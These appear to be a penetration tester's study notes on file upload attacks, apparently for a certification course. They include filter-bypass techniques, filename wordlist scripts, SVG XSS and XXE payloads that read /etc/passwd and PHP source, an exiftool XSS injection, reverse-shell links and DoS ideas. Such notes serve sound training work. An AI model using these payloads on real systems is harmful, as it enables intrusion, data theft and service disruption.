#FileUpload
- Worst kind doesnt authenticate use and doesnt validate file
- find out backend language and upload a test file
#### Shells
- PHP
	- [GitHub - Arrexel/phpbash: A semi-interactive PHP shell compressed into a single file.](https://github.com/Arrexel/phpbash)
	- ![[Pasted image 20250421162640.png]]
	- ![[Pasted image 20250425140304.png]]
- ASP
	- ![[Pasted image 20250421162644.png]]
	- ![[Pasted image 20250425140257.png]]
- [GitHub - pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

#### Client-Side Validation
- local JScript that can be bypassed
- drop in burp proxy
- change html in dev tools
- alter http request inside burp
- Once file is uploaded, check source code for its location
- Sometimes PHP files need to be viewed directly

#### Blacklist filters
- Blacklisting on the backend
	- Default allow then denied
	- Extension based
	- File Type based
	- File content based
- Fuzzing extensions
	- [SecLists/Discovery/Web-Content/web-extensions.txt at master · danielmiessler/SecLists · GitHub](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)
	- [PayloadsAllTheThings/Upload Insecure Files/Extension PHP/extensions.lst at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)
	- [PayloadsAllTheThings/Upload Insecure Files/Extension ASP at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)
	- Load lists into **burp intruder** and look for patterns (such as length) to indicate a valid extension
	- can also fuzz with [[ffuf]] or [[gobuster]]
	- simple test - `<?php echo "Hello, World!"; ?>`
- Non-blacklisted extensions
	- any extension that isnt denied bybackend
	- may not allow code execution however

#### Whitelist filters
- Default deny then allow
- file manager 'supported types' is not a conclusive list
- fuzz extensions to see which ones are accepted
- double extensions
	- sometimes this can 'trick' improper regex or configs
	- forward ie `.jpg.php` - if the application stops looking beyond the 'first' extension and not the last
	- reverse ie `.php.jpg` - if backend executes on the 'first' extension and ignores the last
- character injection
	- try to include some special chars/strings to 'fake out' the backend filtering
	- `%20` `%0a` `%00` `%0d0a` `/` `.\` `.` `…` `:`
	- Bash to generate word lists with above special chars, for 2 specific extensions + .jpg
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```
- content-type filters
	- [SecLists/Discovery/Web-Content/web-all-content-types.txt at master · danielmiessler/SecLists · GitHub](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)
	- backend checks content type
	- create list of image content type example
	```shell-session
	wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
	cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
	```
	- Fuzz file content-type header to see which ones are allowed
- MIME-type filters
	- backend checks file content
	- [List of file signatures - Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)
	- [Wayback Machine - Magic Bytes](https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime)
	- attempt to mask the payload as acceptable file type, such as `GIF8` or `` text in HTTP request or HEX code in the file itself
	- ![[Pasted image 20250423143123.png]]
- Allowed MIME type with a disallowed Content-Type
- Allowed MIME/Content-Type with a disallowed extension
- Disallowed MIME/Content-Type with an allowed extension

#### Limited File Uploads
- Some file extensions allow code to be ran inside them
	- `SVG` files are wrapped `XML` that can contain malicious code
		- XSS
		```xml
		<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
		<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
		    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
		    <script type="text/javascript">alert(window.origin);</script>
		</svg>
		```
		- XXE
		```xml
		<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
		<svg>&xxe;</svg>
		```
		- XXE in a PHP app that parses XML files
		 ```xml
		<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
		<svg>&xxe;</svg>
		```
	- `HTML` files could contain XSS javascript
	- `XML` files could contain XXE vulns
		- some of the SVG xml payloads could be used as straight XML
	- `jpg` or other image files have `exif` or meta data about the photo - this data could contain malicious payloads
		- `exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg`
	- Sometimes changing images mime type to text/html could trigger any html in `exif` data
	- Other documents may use HTML/XML such as **word docs**, **power point docs**, etc
- DOS
	- decompress or zip bombing - nested zips for the server to continuously unpacking
	- pixel flooding - compressed images (such as `jpg`) can be displayed with very large dimensions (`0xffff x 0xffff`)
	- uploading very large files
	- overwrite important system files if a directory traversal vuln exists


![[Pasted image 20250425151238.png]]

##### Extra Client Side

[cpts-quick-references/module/File Upload Attacks.md at main · missteek/cpts-quick-references](https://github.com/missteek/cpts-quick-references/blob/main/module/File%20Upload%20Attacks.md#extra-client-side)

> Client side html code alter to allow file upload validation bypass by removing `validate()`, optional clearing the `onchange` and `accept` values.

[![uploads-client-side-html](https://github.com/missteek/cpts-quick-references/raw/main/images/uploads-client-side-html.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/uploads-client-side-html.png)

##### Extra Wordlist Script

[](https://github.com/missteek/cpts-quick-references/blob/main/module/File%20Upload%20Attacks.md#extra-wordlist-script)

> Character Injection - Before/After Extension to generate list of possible filenames to bypass file upload filters on white or black listings.

```shell
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.php3' '.php4' '.php5' '.php7' '.php8' '.pht' '.phar' '.phpt' '.pgif' '.phtml' '.phtm'; do
        echo "shell$char$ext.jpg" >> filenames_wordlist.txt
        echo "shell$ext$char.jpg" >> filenames_wordlist.txt
        echo "shell.jpg$char$ext" >> filenames_wordlist.txt
        echo "shell.jpg$ext$char" >> filenames_wordlist.txt
    done
done
```

## Content/Type Bypass

[](https://github.com/missteek/cpts-quick-references/blob/main/module/File%20Upload%20Attacks.md#contenttype-bypass)

|**Command**|**Description**|
|---|---|
|[Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)|List of [Web Content-Types](https://academy.hackthebox.com/module/136/section/1290)|
|[Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)|List of All Content-Types|
|[File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)|List of File Signatures/Magic Bytes|

> Example of the Payload code for the file being uploaded, `<?php echo file_get_contents('/flag.txt'); ?>`, add `GIF8` at top of file body and keep the file name as `shell.php`. The `Content-Type:` is then the injection payload position for Burp Suite Intruder using the above wordlists.

## Limited Uploads

[](https://github.com/missteek/cpts-quick-references/blob/main/module/File%20Upload%20Attacks.md#limited-uploads)

|**Potential Attack**|**File Types**|
|---|---|
|`XSS`|HTML, JS, SVG, GIF|
|`XXE`/`SSRF`|XML, SVG, PDF, PPT, DOC|
|`DoS`|ZIP, JPG, PNG|